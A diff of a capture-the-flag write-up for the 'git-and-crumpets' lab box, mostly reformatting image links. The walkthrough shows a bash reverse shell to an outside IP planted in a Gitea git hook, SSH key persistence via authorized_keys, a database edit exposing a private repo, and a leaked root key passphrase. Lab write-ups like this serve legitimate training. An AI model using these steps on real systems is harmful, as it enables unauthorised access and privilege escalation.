@@ -45,7 +45,7 @@ Security measures against it
 Has reverse proxy
 We can see that a reverse proxy has been set up however it's just so that directory enum can be redirected to a rickroll because the boxes aren't directly connected to the internet (so evil!)
 
-![[nginx-reverse-proxy.png]]
+![nginx-reverse-proxy.png](attachments/nginx-reverse-proxy.png)
 
 Back to manual enumeration, after searching for robots.txt, the next thing on this list is to try license.txt and info (.html and .php). Voila, we have a hit! 
 Curl info.php
@@ -62,14 +62,14 @@ In the meantime, here's a fun video I found!
 
 Now that we can have the name of a vhost, we can add it to our /etc/hosts. Navigating to `git.git-and-crumpets.thm` we are greeted with a gitea landing page (you can further research into it if you'd like). 
 
-![[gitea-landing-page.png]]
+![gitea-landing-page.png](attachments/gitea-landing-page.png)
 
 ### Registering new user
 It seems that registering a new user works so we can try making a new account. After successfully logging in we can start exploring repos and something catches our eye. 
 
 **The user scones has some interesting files.**
 
-![[scone-password.png]]
+![scone-password.png](attachments/scone-password.png)
 
 This hints at the fact that something might be hidden in the profile picture. My first instinct is to fire up steghide and see if there are any embedded files. No luck there, let's try strings to check if there's some text embedded in it. Low and behold we there is some cheeky text waiting for us!
 
@@ -86,7 +86,7 @@ withcream@example.com:Password
 ```
 Success! We are now logged in as the user scones. Now in order to get a reverse shell, we need to be able to execute code, uploading a PHP reverse shell to the repo won't work as it will only be displayed and not executed. A possible vector is using Githooks (again I would advise that you do a little research on how they work).
 
-![[git-hook.png]]
+![git-hook.png](attachments/git-hook.png)
 ```
 git@git.git-and-crumpets.thm:scones/cant-touch-this.git
 ```
@@ -96,16 +96,16 @@ Let's edit the githook and include bash commands to get a reverse shell to our h
 bash -i >& /dev/tcp/10.17.13.94/9001 0>&1
 ```
 
-![[git-hook-rev-shell.png]]
+![git-hook-rev-shell.png](attachments/git-hook-rev-shell.png)
 
 # Initial Foothold
-![[initial-foothold.png]]
+![initial-foothold.png](attachments/initial-foothold.png)
 
 Although a reverse shell is sweet, but you know what's sweeter? SSH! Jokes aside, the first step after gaining an initial foothold is always to try and get a more stable shell. Especially in this case, we'll see that we are unable to run curl or wget on this box, therefore in order to transfer files, we would indeed need ssh access. 
 
 Navigating to /home/git/.ssh we can see that we have write permission for authorized keys.
 
-![[write-perm-ssh.png]]
+![write-perm-ssh.png](attachments/write-perm-ssh.pn)
 
 Let's add our own key (or generate one if you haven't done it already) to authorized keys. Now we should be able to transfer files to the machine and also upgrade our own shell.
 
@@ -118,7 +118,7 @@ scp  -i id_rsa /opt/scripts/privilege-escalation-awesome-scripts-suite/linPEAS/l
 Now let's run in and see if anything pops up. Low and behold, something indeed does. We find the sqlite database that's running on gitea, also there seems to be a backup repository for the root user too. Most likely it's the case that they might be hidden and only accessible through admin access on gitea. However, I don't like working on hunches so let's access the SQLite database and verify our hunch ;)
 Transfer over linpeas, interesting output
 
-![[linpeas-out.png]]
+![linpeas-out.png](attachments/linpeas-out.png)
 
 ## Enumerating sqlite3
 We can access the repository by navigating to the directory and launching sqlite3.
@@ -156,15 +156,15 @@ UPDATE repository SET is_private=0 WHERE name='backup';
 ## Accessing gitea as Admin
 Let's first search for all the repos that are present on the site. 
 
-![[admin-all-repos.png]]
+![admin-all-repos.png](attachments/admin-all-repos.png)
 
 Navigating to root, we find nothing special in the first branch however the second one contains 4 commits.
 
-![[root-branch2-commits.png]]
+![root-branch2-commits.png](attachments/root-branch2-commits.png)
 
 Is that an ssh key I see? ;)
 
-![[ssh-key-for-root.png]]
+![ssh-key-for-root.png](attachments/ssh-key-for-root.png)
 
 # Priv Esc
 The key we found is protected by a passphrase. Now you can try to crack it using john, but I can save you the time and tell you that in a final attempt to troll us, Hydragyrum actually gave us the passphrase! It's the title of the key `Sup3rS3cur3`. Wow, I personally while waiting for john to do its thing randomly tried it and it worked! 
@@ -172,6 +172,6 @@ The key we found is protected by a passphrase. Now you can try to crack it using
 Now we can log in as root! 
 *On a side note, I was unable to login directly from my host machine and instead log in from my current ssh session, therefore, using root@localhost. Kept getting invalid id_rsa key error*
 
-![[root.png]]
+![root.png](attachments/root.png)
 
 I won't be sharing the flag as you can go find it yourself now :)
